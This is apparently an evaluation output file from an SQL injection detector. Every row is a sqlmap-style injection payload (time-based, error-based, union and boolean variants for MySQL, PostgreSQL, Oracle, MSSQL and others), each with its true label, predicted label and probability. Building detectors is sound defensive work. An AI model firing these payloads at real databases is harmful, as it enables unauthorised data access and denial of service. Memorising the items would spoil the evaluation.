text,source,fuzzy_cluster_id,true_label,pred_label,prob_sqli,correct
"1%'  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",sajid576/sql-injection-dataset,787,1,1,0.9999945163726807,1
1'   )    )    as xqvq where 4816  =  4816 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,sajid576/sql-injection-dataset,1470,1,1,0.9999946355819702,1
"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'nepn'  =  'nepn",sajid576/sql-injection-dataset,1473,1,1,0.9999947547912598,1
"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'bxjo' like 'bxjo",sajid576/sql-injection-dataset,1486,1,1,0.9999947547912598,1
"1' where 5801  =  5801 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",sajid576/sql-injection-dataset,982,1,1,0.9999947547912598,1
"1%""   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   ""%""  =  """,sajid576/sql-injection-dataset,1500,1,1,0.9999946355819702,1
1'||  (  select 'xhcr' from dual where 9279  =  9279,sajid576/sql-injection-dataset,1506,1,1,0.9999943971633911,1
"1"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""wtkx""  =  ""wtkx",sajid576/sql-injection-dataset,1514,1,1,0.9999947547912598,1
"1  )   as iupg where 2861  =  2861 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sajid576/sql-injection-dataset,1529,1,1,0.9999946355819702,1
"1,  (  select   (  case when   (  2106  =  2106  )   then   (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   else 2106*  (  select 2106 from master..sysdatabases  )   end   )    )",sajid576/sql-injection-dataset,763,1,1,0.9999943971633911,1
-5449' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'ryvy' like 'ryvy,sajid576/sql-injection-dataset,1540,1,1,0.9999947547912598,1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""%""  =  """,sajid576/sql-injection-dataset,1543,1,1,0.9999940395355225,1
"-9183""  )   as wctu where 2058  =  2058 or 3038  =  3038",sajid576/sql-injection-dataset,1553,1,1,0.9999946355819702,1
"1%""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""%""  =  """,sajid576/sql-injection-dataset,1567,1,1,0.9999946355819702,1
"-9122  )   as sdlg where 1546  =  1546 union all select 1546,1546,1546,1546,1546,1546,1546--",sajid576/sql-injection-dataset,1579,1,1,0.9999945163726807,1
1'  )   where 5871  =  5871,sajid576/sql-injection-dataset,1586,1,1,0.9999946355819702,1
"1""   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  ""staz"" like ""staz",sajid576/sql-injection-dataset,1592,1,1,0.9999946355819702,1
"1' and make_set  (  2942  =  8200,8200  )   and 'jnhv' like 'jnhv",sajid576/sql-injection-dataset,1603,1,1,0.9999946355819702,1
"iif  (  5462  =  8866,1,1/0  )",sajid576/sql-injection-dataset,1613,1,1,0.9999947547912598,1
"1"" where 3227  =  3227 waitfor delay '0:0:5'--",sajid576/sql-injection-dataset,1625,1,1,0.9999946355819702,1
"1""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,1371,1,1,0.9999945163726807,1
"1"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""uqor"" like ""uqor",sajid576/sql-injection-dataset,1636,1,1,0.9999946355819702,1
1  )   or sleep  (  5  ),sajid576/sql-injection-dataset,1648,1,1,0.9999947547912598,1
"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",sajid576/sql-injection-dataset,1659,1,1,0.9999947547912598,1
"1%"" and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sajid576/sql-injection-dataset,834,1,1,0.9999942779541016,1
1'+  (  select 'jtvq' where 8288  =  8288 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,sajid576/sql-injection-dataset,1671,1,1,0.9999946355819702,1
1'+  (  select 'leok' where 4320  =  4320,sajid576/sql-injection-dataset,1672,1,1,0.9999943971633911,1
1  )   as jqbp where 5407  =  5407 and 4595  =  4595#,sajid576/sql-injection-dataset,1688,1,1,0.9999946355819702,1
1   )    )    as tnhy where 1874  =  1874 and 2858  =  7324#,sajid576/sql-injection-dataset,1701,1,1,0.9999947547912598,1
-1910' or 2624  =  3371 and 'umoy'  =  'umoy,sajid576/sql-injection-dataset,1702,1,1,0.9999945163726807,1
1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,sajid576/sql-injection-dataset,1715,1,1,0.9999945163726807,1
1'  )   as mqxb where 6496  =  6496 and 7533  =  7533--,sajid576/sql-injection-dataset,1727,1,1,0.9999946355819702,1
"-3756'  )   union all select 1034,1034,1034--",sajid576/sql-injection-dataset,1740,1,1,0.9999946355819702,1
"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",sajid576/sql-injection-dataset,1751,1,1,0.9999940395355225,1
1   )    )     )   and 6358  =  6735,sajid576/sql-injection-dataset,1754,1,1,0.9999945163726807,1
"1""  )   as yecj where 1194  =  1194 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sajid576/sql-injection-dataset,1764,1,1,0.9999947547912598,1
"-8810'  )   or make_set  (  9354  =  9354,7185  )   and   (  'prsn' like 'prsn",sajid576/sql-injection-dataset,1778,1,1,0.9999946355819702,1
-4669  )   or 2452  =  1601#,sajid576/sql-injection-dataset,1789,1,1,0.9999946355819702,1
"1""  )   as ssbz where 8885  =  8885 union all select null,null,null,null,null,null,null,null,null--",sajid576/sql-injection-dataset,1798,1,1,0.9999945163726807,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'teng' like 'teng",sajid576/sql-injection-dataset,1802,1,1,0.9999940395355225,1
"1'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'tpeo' like 'tpeo",sajid576/sql-injection-dataset,1815,1,1,0.9999946355819702,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   ||'",sajid576/sql-injection-dataset,1827,1,1,0.9999943971633911,1
"1   )    )    as amyr where 7875  =  7875 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",sajid576/sql-injection-dataset,1834,1,1,0.9999945163726807,1
1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fuvv'  =  'fuvv,sajid576/sql-injection-dataset,1851,1,1,0.9999946355819702,1
"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",sajid576/sql-injection-dataset,645,1,1,0.9999946355819702,1
1'+  (  select 'xqjx' where 7048  =  7048 and 9198  =  9198--,sajid576/sql-injection-dataset,1858,1,1,0.9999945163726807,1
"1""  )   as zopq where 2680  =  2680",sajid576/sql-injection-dataset,1862,1,1,0.9999946355819702,1
"-2256""   )    )     )   or 1971  =  4537#",sajid576/sql-injection-dataset,1876,1,1,0.9999945163726807,1
1   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   5139  =  5139,sajid576/sql-injection-dataset,1889,1,1,0.9999946355819702,1
"1'||  (  select 'zifu' from dual where 4822  =  4822 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,1901,1,1,0.9999946355819702,1
"1   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   9270  =  9270",sajid576/sql-injection-dataset,1903,1,1,0.9999945163726807,1
"1"" and   (  3020  =  3020  )  *6703",sajid576/sql-injection-dataset,1912,1,1,0.9999946355819702,1
1'   )    )     )   rlike sleep  (  5  )  #,sajid576/sql-injection-dataset,1928,1,1,0.9999945163726807,1
"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )",sajid576/sql-injection-dataset,1935,1,1,0.9999945163726807,1
"1'  )   where 7646  =  7646 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sajid576/sql-injection-dataset,1947,1,1,0.9999946355819702,1
"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",sajid576/sql-injection-dataset,1956,1,1,0.999994158744812,1
"1%""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""%""  =  """,sajid576/sql-injection-dataset,1970,1,1,0.9999945163726807,1
1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,sajid576/sql-injection-dataset,645,1,1,0.9999946355819702,1
"1  )   union all select null,null,null,null,null,null,null#",sajid576/sql-injection-dataset,1981,1,1,0.9999942779541016,1
"1""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,1371,1,1,0.9999945163726807,1
"1   )    )    as yfvg where 1454  =  1454 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",sajid576/sql-injection-dataset,1983,1,1,0.9999946355819702,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",sajid576/sql-injection-dataset,1827,1,1,0.9999942779541016,1
select   (  case when   (  5198  =  2518  )   then 5198 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,sajid576/sql-injection-dataset,1995,1,1,0.9999946355819702,1
"1%'   )    )     )   and make_set  (  1543  =  5817,5817  )   and    (    (     (  '%'  =  '",sajid576/sql-injection-dataset,2009,1,1,0.9999946355819702,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'cxjp'  =  'cxjp",sajid576/sql-injection-dataset,2021,1,1,0.9999945163726807,1
1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  'wuux'  =  'wuux,sajid576/sql-injection-dataset,2034,1,1,0.9999945163726807,1
"1""  )   as tuem where 1328  =  1328",sajid576/sql-injection-dataset,2035,1,1,0.9999945163726807,1
"iif  (  8214  =  4954,1,1/0  )",sajid576/sql-injection-dataset,2045,1,1,0.9999946355819702,1
"1'  )   as wnyl where 8978  =  8978 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,2058,1,1,0.9999947547912598,1
"1'+  (  select fhbk where 2570  =  2570 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",sajid576/sql-injection-dataset,2069,1,1,0.9999946355819702,1
"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",sajid576/sql-injection-dataset,2083,1,1,0.9999947547912598,1
"1""   )    )    as itxo where 7916  =  7916",sajid576/sql-injection-dataset,2087,1,1,0.9999946355819702,1
-9358' or 9887  =  2569--,sajid576/sql-injection-dataset,2096,1,1,0.9999945163726807,1
1'||  (  select 'tznb' from dual where 8808  =  8808 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,sajid576/sql-injection-dataset,2107,1,1,0.9999945163726807,1
"-5798"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )",sajid576/sql-injection-dataset,1397,1,1,0.9999947547912598,1
1'   )    )    as vdhw where 8858  =  8858 order by 1#,sajid576/sql-injection-dataset,2119,1,1,0.9999945163726807,1
"1""  )   where 5129  =  5129 order by 1--",sajid576/sql-injection-dataset,2133,1,1,0.9999945163726807,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'fnon' like 'fnon",sajid576/sql-injection-dataset,2135,1,1,0.999994158744812,1
"-7945%'   )    )     )   union all select 4286,4286,4286,4286,4286,4286--",sajid576/sql-injection-dataset,2144,1,1,0.9999946355819702,1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""vcvb"" like ""vcvb",sajid576/sql-injection-dataset,2156,1,1,0.9999938011169434,1
1'+  (  select tzvm where 5145  =  5145 and 4192  =  7437#,sajid576/sql-injection-dataset,2171,1,1,0.9999946355819702,1
"-3954'   )    )    union all select 2417,2417--",sajid576/sql-injection-dataset,2186,1,1,0.9999946355819702,1
1'||  (  select 'fjlg' from dual where 9517  =  9517,sajid576/sql-injection-dataset,2196,1,1,0.9999945163726807,1
"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",sajid576/sql-injection-dataset,2197,1,1,0.9999942779541016,1
"1%' union all select null,null,null,null,null,null,null#",sajid576/sql-injection-dataset,1437,1,1,0.9999942779541016,1
"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",sajid576/sql-injection-dataset,2209,1,1,0.9999946355819702,1
"1%' or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,1371,1,1,0.9999946355819702,1
1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,sajid576/sql-injection-dataset,645,1,1,0.9999945163726807,1
"1""   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  ""whld""  =  ""whld",sajid576/sql-injection-dataset,2223,1,1,0.9999943971633911,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",sajid576/sql-injection-dataset,1827,1,1,0.9999943971633911,1
"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""vkqt""  =  ""vkqt",sajid576/sql-injection-dataset,2232,1,1,0.9999946355819702,1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   '%'  =  '",sajid576/sql-injection-dataset,866,1,1,0.9999940395355225,1
-5134   )    )     )   or 8571  =  8571--,sajid576/sql-injection-dataset,2244,1,1,0.9999945163726807,1
"-1168   )    )    as vlol where 3475  =  3475 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,2248,1,1,0.9999946355819702,1
"-3037  )   where 9024  =  9024 union all select 9024,9024--",sajid576/sql-injection-dataset,2259,1,1,0.9999946355819702,1
"1   )    )    as oqfr where 6426  =  6426 and make_set  (  8403  =  8403,8899  )  --",sajid576/sql-injection-dataset,2272,1,1,0.9999947547912598,1
"-1868""  )   where 9495  =  9495 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,2284,1,1,0.9999946355819702,1
"1""  )   where 3826  =  3826",sajid576/sql-injection-dataset,2294,1,1,0.9999945163726807,1
select   (  case when   (  6839  =  2730  )   then 6839 else 6839*  (  select 6839 from mysql.db  )   end  )  #,sajid576/sql-injection-dataset,2298,1,1,0.9999942779541016,1
"1  )   union all select null,null,null,null#",sajid576/sql-injection-dataset,1981,1,1,0.9999943971633911,1
"1,  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )",sajid576/sql-injection-dataset,2306,1,1,0.9999946355819702,1
"-8893%'  )   union all select 1254,1254--",sajid576/sql-injection-dataset,2318,1,1,0.9999947547912598,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  #",sajid576/sql-injection-dataset,1827,1,1,0.999994158744812,1
